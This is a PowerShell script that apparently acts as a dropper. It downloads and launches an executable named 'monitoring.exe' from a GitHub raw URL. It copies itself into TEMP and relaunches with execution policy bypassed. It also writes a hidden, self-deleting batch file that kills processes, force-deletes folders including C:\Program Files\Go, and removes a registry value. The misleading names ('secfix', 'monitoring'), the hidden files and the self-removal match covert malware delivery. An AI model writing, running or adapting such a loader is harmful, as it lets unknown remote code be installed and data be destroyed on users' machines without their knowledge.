# --- Config ---
$TempFolder = $env:TEMP
$ExeName = "monitoring.exe"
$ExeUrl = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/monitoring.exe"
$ExePath = Join-Path $TempFolder $ExeName
$BatPath = Join-Path $TempFolder "secfix_un.bat"
$Ps1TempPath = Join-Path $TempFolder "secfnx.ps1"

# --- Download monitoring.exe to TEMP ---
Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing -ErrorAction Stop
Write-Host "[INFO] Downloaded monitoring.exe to $ExePath"

# --- Move this PS1 into TEMP if not already there ---
if ($MyInvocation.MyCommand.Path -ne $Ps1TempPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $Ps1TempPath -Force
    Write-Host "[INFO] Copied PS1 script to TEMP"
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$Ps1TempPath`""; exit
}

# --- Create uninstall batch with full retry/hidden logic ---
$BatContent = @"
@echo off
:: Relaunch hidden if run directly
if not defined IS_HIDDEN (
    start "" /min cmd /c "%~f0" IS_HIDDEN=1 %*
    exit /b
)

:: ---------------- Retry helpers ----------------
:DeleteFolder
rmdir /S /Q "%~1"
if exist "%~1" (
    timeout /t 3 /nobreak >nul
    goto DeleteFolder
)
exit /b

:DeleteFile
del /F /Q "%~1"
if exist "%~1" (
    timeout /t 3 /nobreak >nul
    goto DeleteFile
)
exit /b

:KillProcess
taskkill /F /IM "%~1" >nul 2>&1
tasklist /FI "IMAGENAME eq %~1" | find /I "%~1" >nul
if not errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto KillProcess
)
exit /b

:: ---------------- Main cleanup ----------------
call :KillProcess monitoring.exe
call :KillProcess go.exe

call :DeleteFolder "$TempFolder\secfnx"
call :DeleteFile "$Ps1TempPath"
call :DeleteFolder "C:\Program Files\Go"

:: Remove PATH/GOROOT environment variables
reg delete "HKCU\Environment" /F /V GOROOT >nul 2>&1

:: Delete this batch file
del /F /Q "%~f0"
"@
Set-Content -Path $BatPath -Value $BatContent -Encoding ASCII
attrib +h $BatPath
Write-Host "[INFO] Created uninstall batch at $BatPath"

# --- Run monitoring.exe ---
Start-Process -FilePath $ExePath
Write-Host "[INFO] Started monitoring.exe from TEMP"
